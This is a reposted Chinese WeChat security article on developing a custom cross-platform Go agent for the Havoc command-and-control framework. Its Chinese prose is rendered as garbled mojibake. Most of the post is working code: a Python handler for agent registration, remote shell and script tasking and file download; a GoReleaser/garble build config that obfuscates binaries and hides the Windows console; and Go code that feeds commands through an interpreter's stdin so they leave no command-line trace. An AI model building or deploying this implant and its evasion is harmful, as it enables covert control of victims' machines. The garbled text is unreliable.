#  Havoc Framework C2 Agentå¼€å‘è®°å½•

åŸåˆ› å€¾æ—‹  [ ä¸­å›½ç™½å®¢è”ç›Ÿ ](javascript:void\(0\);)

**ä¸­å›½ç™½å®¢è”ç›Ÿ** ![]()

å¾®ä¿¡å· China_Baiker

åŠŸèƒ½ä»‹ç» ä¸­å›½ç™½å®¢è”ç›Ÿ(BUC)ï¼Œå³æ—¶æ”¶å–è®ºå›(www.chinabaiker.com)æœ€æ–°ã€æœ€çƒ­çš„å¸–å­ã€‚

____

___å‘è¡¨äº_

æ”¶å½•äºåˆé›† #æ¸—é€æµ‹è¯• 90ä¸ª

**æˆæƒè½¬è½½**

 **èƒŒæ™¯**

ğŸ’¡ Havocæ˜¯ä¸€ä¸ªç°ä»£çš„ã€å¯å¡‘æ€§çš„å¼€å‘åå‘½ä»¤å’Œæ§åˆ¶æ¡†æ¶ï¼Œé€‚ç”¨äºæ¸—é€æµ‹è¯•äººå‘˜ã€çº¢é˜Ÿå’Œè“é˜Ÿã€‚å®ƒæ˜¯Githubä¸Šçš„å…è´¹å¼€æºè½¯ä»¶ï¼Œç”±Paul
Ungurï¼ˆC5piderï¼‰ç¼–å†™å’Œç»´æŠ¤ã€‚å¼€æºåœ°å€ï¼š[HavocFramework/Havoc: The Havoc Framework.
(github.com)](https://github.com/HavocFramework/Havoc)

               

![]()

             

Havoc
Frameworkåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼ŒTeamServerç”¨äºè®¾ç½®ç›‘å¬å™¨ã€å¤„ç†Agentè¯·æ±‚ã€å¤„ç†å‘½ä»¤æ‰§è¡Œã€æ–‡ä»¶ä¸‹è½½ç­‰åŠŸèƒ½ï¼ŒClientè´Ÿè´£è¿æ¥TeamServerï¼Œé€šè¿‡Websocketä¸TeamServerç®¡ç†ç«¯å£è¿›è¡Œè®¤è¯ã€‚

Havoc Frameworkçš„ä»“åº“ä¸­ç»´æŠ¤äº†ä¸€ä»½é»˜è®¤çš„Cè¯­è¨€ç‰ˆæœ¬Demon
Agentï¼Œè¿™ä¸ªAgentçš„åŠŸèƒ½æ¯”è¾ƒé½å…¨ï¼Œä½†ç”±äºæ˜¯å¼€æºçš„ï¼Œé»˜è®¤æƒ…å†µä¸‹ç”Ÿæˆçš„Agentæ ·æœ¬ä¼šè¢«ç›´æ¥æŸ¥æ€ï¼Œç‰¹å¾è¾ƒä¸ºæ˜æ˜¾ï¼Œè€Œåœ¨æ ·æœ¬çš„å¯¹æŠ—è§’åº¦ä½œè€…ä¹Ÿæä¾›äº†ä¸€äº›å¯ä»¥ç»™ä½¿ç”¨è€…å‘æŒ¥çš„ç©ºé—´ï¼š

About Evasion

You might ask if the Demon agent bypasses anti-virus (AV) products or even
endpoint detection and response (EDR) products, most likely not. The Demon
agent wasn't designed to be evasive nor was it within the scope. It was
designed to be as malleable and modular as possible to give the operator as
much power over it to adapt it for the red team operation without overloading
it with evasion techniques and features that are going to be most likely
burned and going to be an IOC by itself. And the devs of the agent don't wanna
play the cat and mouse game with AV & EDR vendors. That said, the Demon agent
is designed to be interoperable with common techniques for bypassing anti-
virus software such as loaders, packers, crypters, and stagers.

å¤§è‡´æ„æ€å°±æ˜¯Demonä¸æ˜¯ä¸ºäº†ç»•è¿‡ anti-
virusè€Œå¼€å‘ï¼Œåªæ˜¯æä¾›äº†æºä»£ç ï¼Œè¿™å¥—æºä»£ç ç±»ä¼¼CobaltStrikeçš„Beaconï¼Œè¿™äº›ç»•è¿‡çš„æ´»è¿˜æ˜¯å¾—ä½¿ç”¨è€…å„å‡­æœ¬äº‹ã€‚Havoc
Frameworkçš„æ¶æ„å’ŒCobaltStrikeæ¯”è¾ƒç›¸ä¼¼ï¼Œåªä¸è¿‡TeamServerè¿˜è´Ÿè´£äº†Agentçš„ç”Ÿæˆã€ç¼–è¯‘åŠ¨ä½œã€‚

 **Custom Agent(è‡ªå®šä¹‰)**

åœ¨Havoc Frameworkçš„Githubä¸»é¡µä¸Šï¼Œæä¾›äº†4ä¸ªAgentçš„æ ·ä¾‹ï¼š

![]()

è§‚å¯Ÿäº†ä¸€ä¸‹æºä»£ç ä»¥åï¼Œå‘ç°è¿™äº›Agentå…¨éƒ¨éƒ½ä¸å…¼å®¹Linuxã€MacOSï¼Œæœ¬æ–‡ä»‹ç»ä¸€ä¸‹å¦‚ä½•å¼€å‘è·¨å¹³å°ã€å¸¦ä¸€å®šæ ·æœ¬å¯¹æŠ—èƒ½åŠ›çš„Agentã€‚

è¦å­¦ä¹ Havoc Agentçš„å¼€å‘ï¼Œå¯ä»¥å…ˆå‚è€ƒï¼šhttps://codex-7.gitbook.io/codexs-terminal-window/red-
team/red-team-dev/extending-havoc-c2/third-party-agents
å½“ç„¶ï¼Œè¿™ä¸ªä½œè€…å†™çš„https://github.com/CodeXTF2/PyHmmmæ˜¯ä¸ºäº†æ•™å­¦ï¼Œæ‰€ä»¥è¿˜æ˜¯æœ‰ä¸€äº›ç¼ºé™·ï¼Œä¸èƒ½ç›´æ¥æŠ•å…¥ä½¿ç”¨ã€‚

ç¬¬ä¸‰æ–¹Agentæ³¨å†Œä»¥åï¼Œå‘é€çš„æ•°æ®éƒ½æ˜¯å›ºå®šçš„ç»“æ„ï¼Œæ¯æ¬¡æ•°æ®å‘é€åˆ°C2ç›‘å¬ç«¯å£ï¼Œä¼šæ£€æŸ¥4ä¸ªå­—èŠ‚çš„ï¼ˆMagic Valueï¼‰é­”æ•°ï¼š

![]()

![]()

ï¼ˆCALLBACK
DATAï¼‰å›è°ƒæ•°æ®ä¼šè¢«TeamServerå‘é€åˆ°Pythonå¤„ç†è„šæœ¬ä¸Šï¼Œç„¶åPythonå¤„ç†è„šæœ¬ä½¿ç”¨Websocketä¸TeamServeré€šä¿¡ã€‚

 **å®ç°è¿‡ç¨‹**

è¿™é‡Œä¸»è¦ç®€å•ä»‹ç»ä¸€ä¸‹å®ç°è¦ç‚¹ï¼Œé¦–å…ˆç¼–å†™Agentç±»ï¼Œç”¨äºç»™Havocæ³¨å†ŒAgentä»¥åŠAgentè¯·æ±‚çš„å¤„ç†é€»è¾‘ï¼š

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    class Golang(AgentType):                  Name = "Havoc-Agent"                  Author = "@Rvn0xsy"                  Version = "0.1"                  Description = f"""golang 3rd party agent for Havoc"""                  MagicValue = 0x41414141 # è¿™ä¸ªå¯ä»¥ä¿®æ”¹                  SourceCodeDir = "agent"                  ConfigFile = "agent/options.go"                  AgentName = "Havoc-Agent-Handler"                
      
                      Arch = [                      "386",                      "amd64_v1",                      "arm64"                  ]                
      
                      Formats = [                      {                          "Name": "windows",                          "Extension": "exe",                      },                      {                          "Name": "linux",                          "Extension": "",                      },                      {                          "Name": "darwin",                          "Extension": "",                      },                  ]                
      
                      BuildingConfig = {                      "Sleep": "10"                  }                
      
                      Commands = [                      CommandShell(),                      CommandExit(),                      CommandDownload(),                      CommandShellScript(),                  ]                                    # ç”¨äºæ–‡ä»¶ä¸‹è½½                  def write_tmp_file(self, filename, data):                      md5_hash = hashlib.md5()                      # æ›´æ–°å“ˆå¸Œå¯¹è±¡çš„å†…å®¹                      md5_hash.update(filename.encode('utf-8'))                      # è·å–è®¡ç®—å¾—åˆ°çš„ MD5 å€¼                      filename_md5 = md5_hash.hexdigest()                      filepath = "/tmp/" + filename_md5                      with open(filepath, "wb") as f:                          f.write(b64decode(data))                      return filepath                
      
                      def generate(self, config: dict) -> None:                                                           # ç”ŸæˆåŠŸèƒ½æœ€åä»‹ç»                      logging.info(f"[*] config: {config}")                
      
                          self.builder_send_message(config['ClientID'], "Info", f"hello from service builder")                      self.builder_send_message(config['ClientID'], "Info", f"Options Config: {config['Options']}")                      self.builder_send_message(config['ClientID'], "Info", f"Agent Config: {config['Config']}")                      # ....                
      
                      def response(self, response: dict) -> bytes:                      logging.info("Received request from agent")                      agent_header = response["AgentHeader"]                      # the team server base64 encodes the request.                      agent_response = b64decode(response["Response"])                      agent_json = json.loads(agent_response)                      if agent_json["task"] == "register":                          logging.info("[*] Registered agent")                          self.register(agent_header, json.loads(agent_json["data"]))                          AgentID = response["AgentHeader"]["AgentID"]                          self.console_message(AgentID, "Good", f"Python agent {AgentID} registered", "")                          return b'registered'                      elif agent_json["task"] == "base64":                          AgentID = response["Agent"]["NameID"]                          logging.info("[*] Agent get base64 data")                          if len(agent_json["data"]) > 0:                              print("Output: " + agent_json["data"])                              data = base64.b64decode(agent_json["data"]).decode('utf-8')                              self.console_message(AgentID, "Good", "Received Output:", data)                          return b'get_data'                      elif agent_json["task"] == "get_task":                          AgentID = response["Agent"]["NameID"]                          # self.console_message( AgentID, "Good", "Host checkin", "" )                          logging.info("[*] Agent requested taskings")                          Tasks = self.get_task_queue(response["Agent"])                          logging.info("Tasks retrieved")                          return Tasks                      elif agent_json['task'] == "post_task":                          AgentID = response["Agent"]["NameID"]                          if len(agent_json["data"]) > 0:                              logging.info("Output: " + agent_json["data"])                              self.console_message(AgentID, "Good", "Received Output:", agent_json["data"])                      elif agent_json['task'] == "download_file":                          AgentID = response["Agent"]["NameID"]                          if len(agent_json["data"]) > 0:                              filename = agent_json["external"]                              filepath = self.write_tmp_file(filename, agent_json["data"])                              logging.info("File downloaded")                              self.console_message(AgentID, "Good", "Download: ", filename+" ==> "+filepath)                      return b'ok'

 **æ³¨å†ŒåŠŸèƒ½**

  *   *   *   *   *   * 

    
    
      Commands = [                        CommandShell(),       # æ‰§è¡Œå‘½ä»¤                        CommandExit(),        # é€€å‡ºï¼Œå¥½åƒæœªå®ç°                        CommandDownload(),    # æ–‡ä»¶ä¸‹è½½                        CommandShellScript(), # æ‰§è¡Œè„šæœ¬                    ]

 **å¤„ç†é€»è¾‘**

agent_jsonä¼šæ¥å—åˆ°ä¸é€šçš„æ•°æ®ï¼Œé€šè¿‡å…¶ä¸­çš„å­—æ®µåŒºåˆ†æ˜¯é‚£ç§ç±»å‹çš„è¯·æ±‚ï¼š

â€¢register Agentä¸Šçº¿

â€¢base64 æ¥æ”¶åˆ°Base64çš„æ•°æ®ï¼Œè§£ç è¾“å‡ºåˆ°æ§åˆ¶å°ä¸Š

â€¢get_task ä»TeamServerè·å–ä»»åŠ¡ï¼Œå‘é€ç»™Agent

â€¢post_task å°†æ¥æ”¶åˆ°çš„å†…å®¹å‘é€ç»™Clientæ§åˆ¶å°

â€¢download_file æ¥æ”¶æ–‡ä»¶ä¿å­˜tmpç›®å½•ï¼Œå…¶å®å°±æ˜¯æ–‡ä»¶ä¸‹è½½

Agentç”Ÿæˆé€»è¾‘

ğŸ’¡ GoReleaser æ˜¯ä¸€ä¸ªç”¨äºç®€åŒ– Go é¡¹ç›®å‘å¸ƒè¿‡ç¨‹çš„å¼€æºå·¥å…·ã€‚å®ƒå¯ä»¥è‡ªåŠ¨åŒ–æ„å»ºã€æ‰“åŒ…å’Œå‘å¸ƒ Go
é¡¹ç›®ï¼Œå¹¶æ”¯æŒå°†é¡¹ç›®å‘å¸ƒåˆ°å„ç§ä¸åŒçš„å‘å¸ƒæ¸ é“ï¼Œå¦‚äºŒè¿›åˆ¶æ–‡ä»¶ã€Docker é•œåƒã€Homebrewã€Snapcraft ç­‰ã€‚

ğŸ› ï¸ Garble
æ˜¯ä¸€ä¸ªé€šè¿‡åŒ…è£…Goå·¥å…·é“¾æ¥æ··æ·†Goä»£ç çš„ä¸€ä¸ªå·¥å…·ï¼Œå®ƒåŸºæœ¬ä¸Šå…¼å®¹äº†Goçš„ç¼–è¯‘å‘½ä»¤ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šå¢åŠ äº†ä¸€äº›æ··æ·†æ¨¡å¼çš„é€‰é¡¹ï¼Œé€šè¿‡è®¾ç½®é€‰é¡¹å¯ä»¥æ„å»ºä¸åŒæ··æ·†ç¨‹åº¦çš„GoäºŒè¿›åˆ¶ç¨‹åºã€‚

                 

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    GoReleaser - Buildshttps://github.com/burrowers/garble# This is an example .goreleaser.yml file with some sane defaults.                # Make sure to check the documentation at https://goreleaser.com                project_name: Havoc-Agent-Handler                before:                  hooks:                    # You may remove this if you don't use go modules.                    - go mod tidy                    # you may remove this if you don't need go generate                    - go generate ./...                builds:                  - env:                      - CGO_ENABLED=0                      - LANG=en_US                    goos:                      - linux                      - windows                      - darwin                    goarch:                      - amd64                      - arm64                      - "386"                    command: -tiny                    flags:                      - -literals                      - -seed=random                      - build                      - -trimpath                #      - >-                #        -ldflags={{- if eq .Os "windows" }}"-s -w -H windowsgui"{{else}}"-s -w"{{- end }}                    ldflags:                      - >-                        {{- if eq .Os "windows" }}-s -w -H windowsgui{{else}}-s -w{{- end }}                    gobinary: garble                checksum:                  name_template: 'checksums.txt'                snapshot:                  name_template: "{{ incpatch .Version }}-next"                changelog:                  sort: asc                  filters:                    exclude:                      - '^docs:'                      - '^test:'

è¿™éƒ¨åˆ†æˆ‘é‡‡ç”¨äº†goreleaser+garble ï¼Œèƒ½è¿‡åšä¸€äº›é™æ€å±‚é¢çš„æ··æ·†ï¼š

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    def generate(self, config: dict) -> None:                  
      
                            logging.info(f"[*] config: {config}")                  
      
                            self.builder_send_message(config['ClientID'], "Info", f"hello from service builder")                        self.builder_send_message(config['ClientID'], "Info", f"Options Config: {config['Options']}")                        self.builder_send_message(config['ClientID'], "Info", f"Agent Config: {config['Config']}")                        # å¤åˆ¶ç›®å½•                        random_dir = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))                        dest_dir = os.path.join("/tmp", random_dir)                        shutil.copytree(self.SourceCodeDir, dest_dir)                        logging.info(f"[*] Successfully copied '{self.SourceCodeDir}' to '{dest_dir}'")                        with open(dest_dir + '/options.go', "r") as replacer:                            content = replacer.read()                        modified_content = content.replace('OPTIONS_STRING', json.dumps(config['Options']))                        with open(dest_dir + '/options.go', 'w') as file:                            file.write(modified_content)                        arch = config['Options']['Arch']                        os_type = config['Options']['Format']                        goreleaser_build_command = ["goreleaser", "build", "--snapshot", "--rm-dist", "--single-target"]                        env_variables = os.environ                        env_variables['GOOS'] = os_type                        env_variables['GOARCH'] = arch.replace('_v1', '')                        process = subprocess.Popen(goreleaser_build_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=dest_dir, env=env_variables)                        stdout, stderr = process.communicate()                        self.builder_send_message(config['ClientID'], "Info", "Standard Output:")                        self.builder_send_message(config['ClientID'], "Info", stdout.decode())                        self.builder_send_message(config['ClientID'], "Info", "Standard Error:")                        self.builder_send_message(config['ClientID'], "Info", stderr.decode())                  
      
                            extension = ".exe" if os_type == "windows" else ""                        # Havoc-Agent-Handler_darwin_amd64                        # agent/dist/Havoc-Agent-Handler_windows_amd64.exe                        # agent/dist/Havoc-Agent-Handler_windows_amd64/Havoc-Agent-Handler_windows_amd64.exe                        folder = f"dist/{self.AgentName}_{os_type}_{arch}"                        filename = f"{dest_dir}/{folder}/{self.AgentName}{extension}"                        logging.info(f"[*] filename: {filename}")                        with open(filename, "rb") as f:                            data = f.read()                        self.builder_send_payload(config['ClientID'], self.AgentName + extension,                                                  data)                        shutil.rmtree(dest_dir)

 **å‘½ä»¤æ‰§è¡Œçš„ä¼˜åŒ–**

ä¸ºäº†æ”¯æŒæ‰§è¡Œè·¨å¹³å°çš„å‘½ä»¤ï¼Œå‡å°‘å‘½ä»¤è¡Œçš„ç‰¹å¾ï¼Œæˆ‘ä¼šè€ƒè™‘å°†CMDã€Powershellã€Bashè¿™æ ·çš„è§£é‡Šå™¨è¿›ç¨‹åˆ›å»ºèµ·æ¥ï¼Œç„¶åå‘STDINå†™å…¥å‘½ä»¤æ¥è¯»å–STDOUTè·å–ç»“æœã€‚

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    func (agent *LinuxAgent) ExecuteScript(shell string, command string, timeout time.Duration) string {                         var cmd *exec.Cmd                
      
                             cmd = exec.Command(shell, "-")                
      
                             // è·å–æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰ç®¡é“                         stdin, err := cmd.StdinPipe()                         if err != nil {                                    return err.Error()                         }                
      
                             // è·å–æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ç®¡é“                         stdout, err := cmd.StdoutPipe()                         if err != nil {                                    return err.Error()                         }                
      
                             // å¯åŠ¨è¿›ç¨‹                         err = cmd.Start()                         if err != nil {                                    return err.Error()                         }                
      
                             // åˆ›å»ºä¸€ä¸ªç”¨äºè¯»å–æ ‡å‡†è¾“å‡ºçš„è¯»å–å™¨                         reader := bufio.NewReader(stdout)                
      
                             // åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œå¹¶è®¾ç½®è¶…æ—¶æ—¶é—´                         ctx, cancel := context.WithTimeout(context.Background(), timeout)                         defer cancel()                
      
                             // åˆ›å»ºä¸€ä¸ªç¼“å†²åŒºï¼Œç”¨äºä¿å­˜å‘½ä»¤è¾“å‡ºç»“æœ                         var outputBuf bytes.Buffer                
      
                             // ç”¨äºå‘é€å‘½ä»¤åˆ°æ ‡å‡†è¾“å…¥çš„ goroutine                         go func() {                                    // å°†å‘½ä»¤å­—ç¬¦ä¸²æŒ‰è¡Œæ‹†åˆ†ï¼Œå¹¶é€è¡Œå‘é€åˆ°æ ‡å‡†è¾“å…¥                                    scanner := bufio.NewScanner(strings.NewReader(command))                                    for scanner.Scan() {                                               command := scanner.Text()                                               // å‘é€å‘½ä»¤åˆ°æ ‡å‡†è¾“å…¥                                               _, err := fmt.Fprintln(stdin, command+"\n")                                               if err != nil {                                                          log.Println(err)                                               }                                    }                                    // å…³é—­æ ‡å‡†è¾“å…¥ç®¡é“ï¼Œè¡¨ç¤ºè¾“å…¥ç»“æŸ                                    stdin.Close()                         }()                
      
                             // ç”¨äºè¯»å–å‘½ä»¤è¾“å‡ºç»“æœå¹¶ä¿å­˜åˆ°ç¼“å†²åŒºçš„ goroutine                         go func() {                                    // è¯»å–å‘½ä»¤è¾“å‡ºç»“æœå¹¶ä¿å­˜åˆ°ç¼“å†²åŒº                                    for {                                               select {                                               case <-ctx.Done():                                                          return                                               default:                                                          line, err := reader.ReadString('\n')                                                          if err != nil && err != io.EOF {                                                                     return                                                          }                
      
                                                              outputBuf.WriteString(line)                
      
                                                              if err == io.EOF {                                                                     return                                                          }                                               }                                    }                         }()                
      
                             // ç­‰å¾…è¿›ç¨‹é€€å‡º                         err = cmd.Wait()                         if err != nil {                                    return err.Error()                         }                         // å°†ç¼“å†²åŒºçš„å†…å®¹è½¬æ¢ä¸ºå­—ç¬¦ä¸²                         output := outputBuf.String()                         return output              }

é€šè¿‡è¿™ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥åœ¨C2ä¸­æ‰§è¡Œï¼š

  *   *   * 

    
    
    C2 > shell_script powershell.exe /local/path/to/file.ps1              C2 > shell_script /bin/bash /local/path/to/file.sh              C2 > shell_script cmd.exe /local/path/to/file.bat

å¦‚æ­¤ä¸€æ¥ï¼Œè¿›ç¨‹å‘½ä»¤è¡Œå°±ä¸ä¼šäº§ç”Ÿcmd.exe /c XXX è¿™æ ·æœ‰ç‰¹å¾çš„å†…å®¹ã€‚

![]()

![]()

  

å…¨éƒ¨æºä»£ç ï¼šhttps://github.com/Rvn0xsy/Havoc-Agent-Handler

é¢„è§ˆæ—¶æ ‡ç­¾ä¸å¯ç‚¹

å¾®ä¿¡æ‰«ä¸€æ‰«  
å…³æ³¨è¯¥å…¬ä¼—å·

[çŸ¥é“äº†](javascript:;)

å¾®ä¿¡æ‰«ä¸€æ‰«  
ä½¿ç”¨å°ç¨‹åº

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

ï¼š ï¼Œ ã€‚   è§†é¢‘ å°ç¨‹åº èµ ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆèµ åœ¨çœ‹ ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆåœ¨çœ‹

